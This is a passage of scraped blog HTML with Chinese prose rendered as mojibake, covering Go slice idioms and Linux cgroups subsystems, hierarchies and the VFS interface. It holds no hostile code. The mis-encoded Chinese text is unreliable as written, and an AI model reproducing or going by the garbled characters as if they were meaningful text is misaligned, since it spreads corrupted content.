// å°†iåçš„å…ƒç´ å‰ç§»å¹¶åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæœ‰åˆ©äºåƒåœ¾å›æ”¶
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;insert&#34;&gt;insert&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åœ¨iå‡ºæ’å…¥ä¸€ä¸ªå…ƒç´ 
a = append(a[:i], append([]T{x}, a[i:]...))
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;filter&#34;&gt;filter&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;n := 0
for _, x := range a{
    if keep(x) {
        a[n] = x
        n++
    }
}
a = a[:n]
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;push&#34;&gt;push&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;a = append(a, x)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;pop&#34;&gt;pop&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;x, a = a[len(a)-1], a[:len(a)-1]
// pop front
x, a = a[0], a[1:]
// ä½†æ˜¯è¿™ç§æ–¹å¼ä¼šå¯¼è‡´å¤´éƒ¨çš„å†…å­˜ä¸ä¼šé‡Šæ”¾æ‰
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åˆ‡ç‰‡é™·é˜±&#34;&gt;ï¼åˆ‡ç‰‡é™·é˜±&lt;/h3&gt;
&lt;h4 id=&#34;å¤§é‡å†…å­˜å¾—ä¸åˆ°é‡Šæ”¾&#34;&gt;å¤§é‡å†…å­˜å¾—ä¸åˆ°é‡Šæ”¾&lt;/h4&gt;
&lt;p&gt;åœ¨å·²æœ‰åˆ‡ç‰‡çš„åŸºç¡€ä¸Šå†è¿›è¡Œåˆ‡ç‰‡ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„åº•å±‚æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªåˆ‡ç‰‡å¼•ç”¨äº†åŒä¸€å—å†…å­˜ã€‚é‚£ä¹ˆå­˜åœ¨ä¸€ç§æƒ…å†µï¼ŒåŸåˆ‡ç‰‡å­˜åœ¨å¤§é‡æ•°æ®ï¼Œæ–°åˆ‡ç‰‡åªæ˜¯ä½¿ç”¨äº†ä¸€å°æ®µï¼Œä½†åº•å±‚æ•°ç»„ä»å æ®äº†å¤§é‡çš„ç©ºé—´ï¼Œå¾—ä¸åˆ°é‡Šæ”¾ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºè¿™ç§æƒ…å†µå¯ä»¥ä½¿ç”¨copyæ›¿ä»£re-sliceã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// b = a[start:end]
b = make([]int, len)
copy(b, a[start:end])
&lt;/code&gt;&lt;/pre&gt;
">ã€goã€‘é«˜æ€§èƒ½ç¼–ç¨‹</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cgroup/"" data-c="
          &lt;h2 id=&#34;åŸºæœ¬åŸç†&#34;&gt;åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;cgroupsæ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¸»è¦ç”¨æ¥å¯¹å…±äº«èµ„æºè¿›è¡Œéš”ç¦»ã€é™åˆ¶ã€å®¡è®¡ç­‰ã€‚é€šè¿‡cgroupå¯ä»¥å°†å®šé¢çš„èµ„æºåˆ†é…ç»™ç‰¹å®šçš„ä¸€ç»„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œç¼–è¯‘å†…æ ¸æ—¶æ‰“å¼€cgroupçš„ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹ä½äºåŒä¸€ä¸ªcgroupï¼Œå°±æ˜¯æ ¹ï¼Œè¿™ä¸ªcgroupäº«æœ‰æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡cgroupæ–‡ä»¶ç³»ç»Ÿå»ºç«‹ä¸€ä¸ªæ–°çš„cgroupï¼Œç„¶åé…ç½®è¿™ä¸ªæ–°çš„cgroupï¼Œé…ç½®çš„å†…å®¹åŒ…æ‹¬ä¸ºå…¶åˆ†é…è¿›ç¨‹ã€åˆ†é…èµ„æºç­‰ã€‚è¿™ä¸ªåˆ›å»ºå’Œåˆ†é…çš„æ‰€æœ‰è¿‡ç¨‹éƒ½æ˜¯cgroupæ–‡ä»¶ç³»ç»Ÿé€šè¿‡&lt;code&gt;shell echo&lt;/code&gt;å†™è¿›æ–‡ä»¶å®Œæˆçš„ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæœ¬èº«æ—¶åˆ†å±‚çš„ï¼Œä¸€ä¸ªæ ¹å±‚ä¸‹é¢å°±åƒä¸€æ£µæ ‘ä¸€æ ·å¯ä»¥åˆ†å¾ˆå¤šå±‚ã€‚æ¯ä¸€å±‚çš„cgroupæ–‡ä»¶ç³»ç»Ÿç›®å½•ä¸‹éƒ½æœ‰è¯¥å±‚å¯¹åº”çš„èµ„æºé…ç½®æ–‡ä»¶ã€‚è¿™äº›å¯ä»¥é…ç½®çš„èµ„æºéƒ½æ˜¯cgroupå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;å­ç³»ç»Ÿ(subsystem)å®é™…ä¸Šæ˜¯cgroupå¯¹è¿›ç¨‹ç»„è¿›è¡Œèµ„æºæ§åˆ¶çš„å…·ä½“ä½“ç°ã€‚å­ç³»ç»Ÿå…·æœ‰å¤šç§ç±»å‹ï¼Œæ¯ä¸ªç±»å‹çš„å­ç³»ç»Ÿéƒ½ä»£è¡¨ä¸€ç§ç³»ç»Ÿèµ„æºï¼Œæ¯”å¦‚&lt;code&gt;CPUã€memory&lt;/code&gt;ç­‰ã€‚å½“åˆ›å»ºä¸€ä¸ªcgroupå®ä¾‹æ—¶ï¼Œå¿…é¡»è‡³å°‘æŒ‡å®šä¸€ç§å­ç³»ç»Ÿã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ–°å»ºçš„è¿›ç¨‹ç»„åœ¨è®¿é—®å­ç³»ç»Ÿå¯¹åº”çš„ç³»ç»Ÿèµ„æºæ—¶å°±æœ‰äº†ä¸€äº›é™åˆ¶ã€‚å…·ä½“çš„é™åˆ¶é¡¹ä¸å­ç³»ç»Ÿçš„ç±»å‹æœ‰å…³ã€‚&lt;/p&gt;
&lt;p&gt;cgroupä¸­è¿›ç¨‹ç»„çš„å±‚çº§å…³ç³»ä¸Linuxä¸­è¿›ç¨‹çš„å±‚çº§å…³ç³»æ¯”è¾ƒç±»ä¼¼ã€‚åœ¨Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹é€šè¿‡&lt;code&gt;fork()&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å­˜åœ¨çˆ¶å­è¿™æ ·çš„ç­‰çº§å…³ç³»ï¼Œå¹¶ä¸”å­è¿›ç¨‹å¯ä»¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä¸€äº›èµ„æºã€‚ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹å½¢æˆä¸€ä¸ªæ ‘å½¢çš„ç­‰çº§å…³ç³»ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½å”¯ä¸€çš„ä½äºè¿›ç¨‹æ ‘ä¸­çš„æŸä¸€ä¸ªä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºcgroupæ¥è¯´ï¼Œcgroupå®ä¾‹ä¹‹é—´ä¹Ÿæ˜¯æœ‰å…·ä½“çº§åˆ«å…³ç³»çš„ï¼Œä½†æ˜¯å®ƒä»¬å±‚çº§å…³ç³»æ˜¯ä¸ºäº†æ›´ç»†ç²’åº¦çš„å¯¹è¿›ç¨‹ç»„è¿›è¡Œèµ„æºæ§åˆ¶ã€‚åŒæ—¶ï¼Œå­cgroupä¼šç»§æ‰¿çˆ¶cgroupçš„å¯¹èµ„æºçš„æ§åˆ¶å±æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å­ç³»ç»Ÿä¸å±‚çº§å…³ç³»&#34;&gt;å­ç³»ç»Ÿä¸å±‚çº§å…³ç³»&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454770921.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¸€ä¸ªå­ç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªèµ„æºæ§åˆ¶å™¨ã€‚cgroupä¹ä¸ªå­ç³»ç»Ÿåˆ†åˆ«æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cpu&lt;/code&gt; å­ç³»ç»Ÿï¼Œä¸»è¦é™åˆ¶è¿›ç¨‹çš„ cpu ä½¿ç”¨ç‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuacct&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ç»Ÿè®¡ cgroups ä¸­çš„è¿›ç¨‹çš„ cpu ä½¿ç”¨æŠ¥å‘Šã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuset&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ä¸º cgroups ä¸­çš„è¿›ç¨‹åˆ†é…å•ç‹¬çš„ cpu èŠ‚ç‚¹æˆ–è€…å†…å­˜èŠ‚ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;memory&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥é™åˆ¶è¿›ç¨‹çš„ memory ä½¿ç”¨é‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blkio&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥é™åˆ¶è¿›ç¨‹çš„å—è®¾å¤‡ ioã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;devices&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æ§åˆ¶è¿›ç¨‹èƒ½å¤Ÿè®¿é—®æŸäº›è®¾å¤‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net_cls&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æ ‡è®° cgroups ä¸­è¿›ç¨‹çš„ç½‘ç»œæ•°æ®åŒ…ï¼Œç„¶åå¯ä»¥ä½¿ç”¨tc æ¨¡å—ï¼ˆtraffic controlï¼‰å¯¹æ•°æ®åŒ…è¿›è¡Œæ§åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;freezer&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æŒ‚èµ·æˆ–è€…æ¢å¤ cgroups ä¸­çš„è¿›ç¨‹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ns&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ä¸åŒ cgroups ä¸‹é¢çš„è¿›ç¨‹ä½¿ç”¨ä¸åŒçš„ namespaceã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;hierarchyå±‚çº§ç»“æ„&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å†…æ ¸ä½¿ç”¨ cgroup ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ª control group å¯¹æŸä¸€ä¸ªæˆ–è€…æŸå‡ ä¸ª cgroups å­ç³»ç»Ÿçš„èµ„æºé™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;hierarchyçš„åŠŸèƒ½æ˜¯æŠŠä¸€ç»„cgroupä¸²æˆä¸€ä¸ªæ ‘çŠ¶çš„å½¢çŠ¶ï¼Œä¸€æ£µè¿™æ ·çš„æ ‘æ˜¯ä¸€ä¸ªhierarchyï¼Œé€šè¿‡è¿™ç§æ ‘çŠ¶ç»“æ„ï¼Œcgroupå¯ä»¥åšåˆ°ç»§æ‰¿ã€‚&lt;em&gt;ä¾‹å¦‚ç³»ç»Ÿå¯¹ä¸€ç»„å®šæ—¶çš„ä»»åŠ¡è¿›ç¨‹é€šè¿‡cgroup1é™åˆ¶äº†CPUçš„ä½¿ç”¨ç‡ï¼Œç„¶åå…¶ä¸­æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡éœ€è¦é™åˆ¶ç£ç›˜IOï¼Œå°±å¯ä»¥åˆ›å»ºcgroup2ï¼Œä½¿å…¶ç»§æ‰¿ä¸cgroup1ï¼Œè¿™æ ·cgroup2ç»§æ‰¿äº†cgroup1å¯¹CPUä½¿ç”¨ç‡çš„é™åˆ¶ï¼ŒåŒæ—¶ä¹Ÿé™åˆ¶äº†ç£ç›˜IOã€‚&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªhierarchyå¯ä»¥attachä¸€ä¸ªæˆ–å¤šä¸ªå­ç³»ç»Ÿï¼Œå½“å‰å±‚çº§ç»“æ„å¯ä»¥å¯¹å…¶ attach çš„å­ç³»ç»Ÿè¿›è¡Œèµ„æºçš„é™åˆ¶ã€‚æ¯ä¸€ä¸ªå­ç³»ç»Ÿåªèƒ½è¢«attachåˆ°ä¸€ä¸ªhierarchyä¸­ã€‚ä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥å±äºå¤šä¸ªcgroupï¼Œä½†æ˜¯è¿™äº›cgroupå¿…é¡»å±äºä¸åŒçš„hierarchyã€‚&lt;/p&gt;
&lt;p&gt;å½“å»ºç«‹ç¬¬ä¸€ä¸ªcgroupæ—¶ï¼Œç³»ç»Ÿä¼šæŠŠæ‰€æœ‰çš„è¿›ç¨‹éƒ½æ”¾è¿›å»ï¼Œå¯¹åº”æ ‘å½¢ç»“æ„çš„æ ‘æ ¹ï¼Œä¾‹å¦‚&lt;code&gt;cat /sys/fs/cgroup/cpu/task&lt;/code&gt;ä¼šè¾“å‡ºæ‰€æœ‰è¿›ç¨‹çš„pidã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœåœ¨ä¸‹çº§cgroupï¼Œä¾‹å¦‚/cgroup/testçš„&lt;code&gt;task&lt;/code&gt;ä¸­å°†ä¸€ä¸ªè¿›ç¨‹çš„PID &lt;code&gt;echo&lt;/code&gt;åˆ°æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªè¿›ç¨‹å¹¶æ²¡æœ‰ä»ä¸Šå±‚cgroupçš„&lt;code&gt;task&lt;/code&gt;åˆ—è¡¨ä¸­æ¶ˆå¤± ï¼Œè€Œæ˜¯åŒæ—¶å‡ºç°åœ¨äº†ä¸‹å±‚test cgroupçš„&lt;code&gt;task&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œè¿™å°±è¡¨ç¤ºè¯¥è¿›ç¨‹ç°åœ¨å½’test cgroupæ§åˆ¶ã€‚ä½†ç”±äºtest cgroupæ˜¯ä¸‹å±‚ cgroup ï¼Œæ‰€ä»¥è¿›ç¨‹ä¾ç„¶å­˜åœ¨äºä¸Šcgroupï¼Œè€ŒåŒå±‚çš„ cgroup ä¹‹é—´å´ä¸èƒ½å«æœ‰ç›¸åŒçš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹å›¾æ—¶ä¸€ä¸ªcgroupç»“æ„å›¾ï¼ŒåŒ…å«ä¸¤ä¸ªå±‚çº§ï¼Œå³ç¬¬ä¸€å±‚çº§&lt;code&gt;cpu_mem&lt;/code&gt;å’Œç¬¬äºŒå±‚çº§&lt;code&gt;cpuset_net&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454793175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;ç³»ç»Ÿä¸­ç¬¬ä¸€ä¸ªè¢«åˆ›å»ºçš„cgroupè¢«ç§°ä¸º&lt;code&gt;root cgroup&lt;/code&gt;ï¼Œè¯¥cgroupçš„æˆå‘˜åŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ã€‚å…¶ä¸‹åˆåŒ…å«ä»&lt;code&gt;cgroup1&lt;/code&gt;å’Œ&lt;code&gt;cgroup2&lt;/code&gt;ä¸¤ä¸ªcgroupï¼Œä½äºç¬¬äºŒå±‚çº§&lt;code&gt;cpuset_net&lt;/code&gt;ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªå­ç³»ç»Ÿåªèƒ½ä½äºä¸€ä¸ªå±‚çº§ä¸­ã€‚åœ¨å›¾ä¸­ï¼Œ&lt;code&gt;cpu&lt;/code&gt;å­ç³»ç»Ÿä½äºç¬¬ä¸€å±‚çº§&lt;code&gt;cpu_mem&lt;/code&gt;ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªå­ç³»ç»Ÿå°†ä¸èƒ½å†ä½äºç¬¬äºŒå±‚çº§ä¸­ã€‚ä¸è¿‡ç¬¬äºŒå±‚çº§ä¼šç»§æ‰¿ç¬¬ä¸€å±‚çº§çš„cpuå­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªå±‚çº§ä¸­å¯ä»¥å…³è”å¤šä¸ªå­ç³»ç»Ÿã€‚ç¬¬ä¸€å±‚çº§å…³è”äº†&lt;code&gt;cpu&lt;/code&gt;å’Œ&lt;code&gt;memory&lt;/code&gt;å­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ä½äºä¸åŒå±‚çº§çš„cgroupä¸­ã€‚ç”±äº&lt;code&gt;root cgroup&lt;/code&gt;åŒ…å«äº†ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ï¼Œå› æ­¤&lt;code&gt;cgroup2&lt;/code&gt;ä¸­çš„è¿›ç¨‹Pä¹Ÿä½äº&lt;code&gt;root cgroup&lt;/code&gt;ä¸­ã€‚ä»èµ„æºæ§åˆ¶è§’åº¦æ¥è¯´ï¼Œè¿›ç¨‹Pæ‰€åœ¨çš„è¿›ç¨‹ç»„åœ¨è®¿é—®&lt;code&gt;cpuã€memory&lt;/code&gt;å’Œ&lt;code&gt;net&lt;/code&gt;æ—¶ä¼šå—åˆ°èµ„æºé™åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºäº†å­è¿›ç¨‹åï¼Œè¯¥å­è¿›ç¨‹é»˜è®¤ä¸ºçˆ¶è¿›ç¨‹æ‰€åœ¨çš„cgroupçš„æˆå‘˜ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åœ¨åˆ›å»ºäº† cgroups å±‚çº§ç»“æ„ä¸­çš„èŠ‚ç‚¹ï¼ˆcgroup ç»“æ„ä½“ï¼‰ä¹‹åï¼Œå¯ä»¥æŠŠè¿›ç¨‹åŠ å…¥åˆ°æŸä¸€ä¸ªèŠ‚ç‚¹çš„æ§åˆ¶ä»»åŠ¡åˆ—è¡¨ä¸­ï¼Œä¸€ä¸ªèŠ‚ç‚¹çš„æ§åˆ¶åˆ—è¡¨ä¸­çš„æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šå—åˆ°å½“å‰èŠ‚ç‚¹çš„èµ„æºé™åˆ¶ã€‚åŒæ—¶æŸä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥è¢«åŠ å…¥åˆ°ä¸åŒçš„ cgroups å±‚çº§ç»“æ„çš„èŠ‚ç‚¹ä¸­ï¼Œå› ä¸ºä¸åŒçš„ cgroups å±‚çº§ç»“æ„å¯ä»¥è´Ÿè´£ä¸åŒçš„ç³»ç»Ÿèµ„æºã€‚æ‰€ä»¥è¯´è¿›ç¨‹å’Œ cgroup ç»“æ„ä½“æ˜¯ä¸€ä¸ªå¤šå¯¹å¤šçš„å…³ç³»ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621991742733.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¸Šé¢è¿™ä¸ªå›¾ä»æ•´ä½“ç»“æ„ä¸Šæè¿°äº†è¿›ç¨‹ä¸ cgroups ä¹‹é—´çš„å…³ç³»ã€‚æœ€ä¸‹é¢çš„&lt;code&gt;P&lt;/code&gt;ä»£è¡¨ä¸€ä¸ªè¿›ç¨‹ã€‚æ¯ä¸€ä¸ªè¿›ç¨‹çš„æè¿°ç¬¦ä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªè¾…åŠ©æ•°æ®ç»“æ„&lt;code&gt;css_set(cgroups subsystem set)&lt;/code&gt;ã€‚ æŒ‡å‘æŸä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹ä¼šè¢«åŠ å…¥åˆ°å½“å‰&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹é“¾è¡¨ä¸­ã€‚ä¸€ä¸ªè¿›ç¨‹åªèƒ½éš¶å±äºä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;ï¼Œä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;å¯ä»¥åŒ…å«å¤šä¸ªè¿›ç¨‹ï¼Œéš¶å±äºåŒä¸€&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹å—åˆ°åŒä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;æ‰€å…³è”çš„èµ„æºé™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šå›¾ä¸­çš„&lt;code&gt;&amp;quot;MÃ—N Linkage&amp;quot;&lt;/code&gt;è¯´æ˜çš„æ˜¯&lt;code&gt;css_set&lt;/code&gt;é€šè¿‡è¾…åŠ©æ•°æ®ç»“æ„å¯ä»¥ä¸ cgroups èŠ‚ç‚¹è¿›è¡Œå¤šå¯¹å¤šçš„å…³è”ã€‚ä½†æ˜¯ cgroups çš„å®ç°ä¸å…è®¸&lt;code&gt;css_set&lt;/code&gt;åŒæ—¶å…³è”åŒä¸€ä¸ªcgroupså±‚çº§ç»“æ„ä¸‹å¤šä¸ªèŠ‚ç‚¹ã€‚ è¿™æ˜¯å› ä¸º cgroups å¯¹åŒä¸€ç§èµ„æºä¸å…è®¸æœ‰å¤šä¸ªé™åˆ¶é…ç½®ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;å…³è”å¤šä¸ª cgroups å±‚çº§ç»“æ„çš„èŠ‚ç‚¹æ—¶ï¼Œè¡¨æ˜éœ€è¦å¯¹å½“å‰&lt;code&gt;css_set&lt;/code&gt;ä¸‹çš„è¿›ç¨‹è¿›è¡Œå¤šç§èµ„æºçš„æ§åˆ¶ã€‚è€Œä¸€ä¸ª cgroups èŠ‚ç‚¹å…³è”å¤šä¸ª&lt;code&gt;css_set&lt;/code&gt;æ—¶ï¼Œè¡¨æ˜å¤šä¸ª&lt;code&gt;css_set&lt;/code&gt;ä¸‹çš„è¿›ç¨‹åˆ—è¡¨å—åˆ°åŒä¸€ä»½èµ„æºçš„ç›¸åŒé™åˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;vfsæ–‡ä»¶ç³»ç»Ÿ&#34;&gt;VFSæ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;cgroupéœ€è¦æä¾›æ¥å£ç»™ç”¨æˆ·æ€ï¼Œæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯æä¾›ç³»ç»Ÿè°ƒç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯æä¾›è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚cgroupé€‰æ‹©ä¸ªåè€…ï¼Œå®ƒæä¾›äº†ä¸€ç§åä¸ºcgroupçš„æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;VFS(Virtual File System) æ˜¯ä¸€ä¸ªå†…æ ¸æŠ½è±¡å±‚ï¼Œèƒ½å¤Ÿéšè—å…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚ï¼Œä»è€Œç»™ç”¨æˆ·æ€è¿›ç¨‹æä¾›ä¸€å¥—ç»Ÿä¸€çš„ API æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;VFS ä½¿ç”¨äº†ä¸€ç§é€šç”¨æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡ï¼Œå…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿåªè¦å®ç°äº† VFS çš„è®¾è®¡æ¥å£ï¼Œå°±èƒ½å¤Ÿæ³¨å†Œåˆ° VFS ä¸­ï¼Œä»è€Œä½¿å†…æ ¸å¯ä»¥è¯»å†™è¿™ç§æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;è¿™å¾ˆåƒé¢å‘å¯¹è±¡è®¾è®¡ä¸­çš„æŠ½è±¡ç±»ä¸å­ç±»ä¹‹é—´çš„å…³ç³»ï¼ŒæŠ½è±¡ç±»è´Ÿè´£å¯¹å¤–æ¥å£çš„è®¾è®¡ï¼Œå­ç±»è´Ÿè´£å…·ä½“çš„å®ç°ã€‚å…¶å®ï¼ŒVFSæœ¬èº«å°±æ˜¯ç”¨ c è¯­è¨€å®ç°çš„ä¸€å¥—é¢å‘å¯¹è±¡çš„æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;cgroupé€šè¿‡VFSå‘ç”¨æˆ·å±‚æä¾›æ¥å£ï¼Œç”¨æˆ·é€šè¿‡æŒ‚è½½ï¼Œåˆ›å»ºç›®å½•ï¼Œè¯»å†™æ–‡ä»¶çš„æ–¹å¼ä¸cgroupäº¤äº’ã€‚&lt;/p&gt;
&lt;h4 id=&#34;é€šç”¨æ–‡ä»¶æ¨¡å‹&#34;&gt;&lt;strong&gt;é€šç”¨æ–‡ä»¶æ¨¡å‹&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;VFS é€šç”¨æ–‡ä»¶æ¨¡å‹ä¸­åŒ…å«ä»¥ä¸‹å››ç§å…ƒæ•°æ®ç»“æ„ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;è¶…çº§å—å¯¹è±¡&lt;/strong&gt;(superblock object)ï¼Œç”¨äºå­˜æ”¾å·²ç»æ³¨å†Œçš„æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ã€‚æ¯”å¦‚ext2ï¼Œext3ç­‰è¿™äº›åŸºç¡€çš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œè¿˜æœ‰ç”¨äºè¯»å†™socketçš„socketæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥åŠå½“å‰çš„ç”¨äºè¯»å†™cgroupsé…ç½®ä¿¡æ¯çš„ cgroups æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡&lt;/strong&gt;(inode object)ï¼Œç”¨äºå­˜æ”¾å…·ä½“æ–‡ä»¶çš„ä¿¡æ¯ã€‚å¯¹äºä¸€èˆ¬çš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿè€Œè¨€ï¼Œinode èŠ‚ç‚¹ä¸­ä¸€èˆ¬ä¼šå­˜æ”¾æ–‡ä»¶åœ¨ç¡¬ç›˜ä¸­çš„å­˜å‚¨å—ç­‰ä¿¡æ¯ï¼›å¯¹äºsocketæ–‡ä»¶ç³»ç»Ÿï¼Œinodeä¼šå­˜æ”¾socketçš„ç›¸å…³å±æ€§ï¼Œè€Œå¯¹äºcgroupsè¿™æ ·çš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œinodeä¼šå­˜æ”¾ä¸ cgroup èŠ‚ç‚¹ç›¸å…³çš„å±æ€§ä¿¡æ¯ã€‚è¿™é‡Œé¢æ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªéƒ¨åˆ†æ˜¯ä¸€ä¸ªå«åš inode_operations çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“å®šä¹‰äº†åœ¨å…·ä½“æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºæ–‡ä»¶ï¼Œåˆ é™¤æ–‡ä»¶ç­‰çš„å…·ä½“å®ç°ã€‚&lt;/li&gt;
